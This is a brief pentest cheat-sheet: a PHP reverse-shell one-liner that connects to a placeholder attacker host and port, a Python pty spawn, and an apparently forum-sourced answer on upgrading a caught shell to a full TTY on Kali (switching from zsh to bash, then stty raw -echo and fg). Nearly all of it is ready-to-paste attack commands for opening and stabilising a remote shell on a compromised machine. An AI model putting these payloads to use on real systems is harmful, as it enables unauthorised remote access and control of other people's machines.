python3 -c 'import pty; pty.spawn("/bin/bash")'  
-----------------  
php -r '$sock=fsockopen("ATTACKER", PORT);exec("/bin/sh -i <&3 >&3 2>&3");'  
^Reverse shell on PHP  
  
  
##################################################################################  
  
2  
  
The reason why it doesn't work in Kali Linux is because the latest Kali uses the zsh shell by default, not bash. To get it to work, you just have to make sure you're using the bash shell.  
  
To temporarily switch to a bash shell, run the following command in your terminal:  
  
exec bash --login  
  
You can confirm if you're using bash by running:  
  
ps -p $$  
  
In the terminal which uses bash, run the listener and run the commands to upgrade the shell:  
  
python -c 'import pty; pty.spawn("/bin/bash")'  
CTRL + Z  
stty raw -echo  
fg  
export TERM=xterm  
OR
script -q /dev/null bash
As long as you're using bash and not zsh, it will work.  
##################################################################################